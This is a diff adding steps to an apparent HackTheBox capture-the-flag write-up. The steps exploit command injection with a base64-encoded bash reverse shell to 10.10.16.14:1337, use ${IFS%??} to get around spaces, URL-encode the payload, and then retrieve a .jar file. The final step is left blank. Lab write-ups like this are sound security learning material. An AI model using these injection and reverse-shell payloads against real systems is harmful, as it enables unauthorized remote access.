@@ -81,6 +81,70 @@ Nmap done: 1 IP address (1 host up) scanned in 18.72 seconds
 
 11. Noticed the server responds an error for the ssh command.
 12. This make it clear, that the vuln should be related to command injection.
+13. The idea is using basic bash reverse shell payload:
+
+> BASH REVERSE SHELL PAYLOAD
+
+```txt
+bash -i >& /dev/tcp/10.10.16.14/1337 0>&1
+```
+
+> ENCODE IT TO BASE64 (adding -w 0, to make sure the output is a single line command)
+
+```
+echo "bash -i >& /dev/tcp/10.10.16.14/1337 0>&1" | base64 -w 0
+```
+
+> RESULT
+
+```
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK
+```
+
+14. Great! Now for the final payload, because we want the server to decode our payload first then execute it, hence we use `base64 -d`.
+15. But again, we need to encode it again with `url-encode` to terminate all the spaces.
+16. The best practice is to use --> `${IFS%??}` to avoid spaces or other characters that may be treated as delimiters by the shell.
+17. Then we url-encode the payload, set listener and send our payload.
+
+> PAYLOAD
+
+```
+Original one:
+
+echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK" | base64 -d | bash;
+
+Adding ${IFS%??} to covering whitespaces
+
+;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA+JjEK"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
+
+URL-ENCODE:
+
+%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNi4xNC8xMzM3IDA%2BJjEK%22%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbase64%24%7BIFS%25%3F%3F%7D%2Dd%24%7BIFS%25%3F%3F%7D%7C%24%7BIFS%25%3F%3F%7Dbash%3B
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/8d7f115a-0819-4aa5-b627-3d54677ed0cd)
+
+
+18. At this point we can't get user flag, because we're not having the shell as "josh".
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/a925e28b-c55b-4833-b19a-99e927f38459)
+
+
+19. Noticed there's a .jar file which might be our interest.
+20. Let's setup a python server at the remote server and download the file to our local machine.
+
+#### NOTES: setup python server at port other than 80.
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/1b6709ea-e312-4421-8cce-40996c53d1df)
+
+
+21. 
+
+
 
 
 
